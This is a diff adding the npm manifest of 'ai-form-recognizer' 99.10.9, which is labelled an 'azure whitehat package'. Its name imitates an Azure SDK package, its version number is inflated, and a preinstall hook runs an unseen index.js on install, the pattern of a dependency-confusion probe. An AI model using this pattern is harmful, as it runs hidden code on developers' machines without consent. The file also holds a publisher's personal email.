@@ -1,0 +1,39 @@
+{
+    "name": "ai-form-recognizer",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "ai-form-recognizer@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-RmrsXCQBq3cLKXiqwUhF6TgS3lBOUzIJNmDC0YgWRNbiblMmTz1Je385KjDqSKZHWy874aY74B/b1LWYVlXbCQ==",
+        "shasum": "dc84057112a4db5fbde170fe7dd3fc7ccf0d5b8d",
+        "tarball": "https://registry.npmjs.org/ai-form-recognizer/-/ai-form-recognizer-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3582,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooDWCRA9TVsSAnZWagAAhtoP/j0OIWJo7Is1aA2b0but\nq33oA+lPSLL2jnunpYv+U2oSGFP0kFtFEDJ/JWtRaoXRmzZa8T4Nt/OtQa41\nEiSeNJy7movsUcuP4XuEyu1EJh6m8ElNarY70bcceRweLxOma8MH1Qzi3iHR\n1440VUmaTiXI/28uvixmBPSJ4RzEL1sU65N08UN0KDChCqrwEm8gCzcQuKCa\nSdHl+xgM5xRG8q4g9nAaeSNfSqG6AcPk4NCqcnCk95W0u7nco6RtIWJghiqC\noId1IifwqEjpK4xZ1Wm4ab47bE0VMFJJVJGwofaS+DCEihAa8uBIEtQrXRfi\n9Rtd3Yrvul/wz1/Yz2b5Q0DpKU44L5T5Wdc/A//+tWmuW2LxVm4vsaRkSwNC\nJebV1a7FOjRTn1AdrhiufTFxSFqOrPxU7mcFlRd5Mxq1ba01TdQbNn9uQmy9\nIU0I9uIQ9QFJRFJpVHMR0SLdMYo2Cjz8IhH3D/AHIR9X4oo4jxH0DbfVLaEr\nIJyEwpvbbC1I7S2aeuVVtU6/JATvjLBb5DYggrrDH14ZXnT+xiJ+6aa4SHUU\niFU/thrXTC99UkkuGFzlVPt91k3pKDagidIPoTXNXG4KyA5gukPPi5+tUAa5\nBlp8+vcoR7hdVHGgXmUD0Ot6tt9mQiDPT/qa/FoEyubsXtNyl8SOdKnPAIst\n7aDR\r\n=TxvB\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/ai-form-recognizer_99.10.9_1638039766552_0.41259442632158305"
+    },
+    "_hasShrinkwrap": false
+}
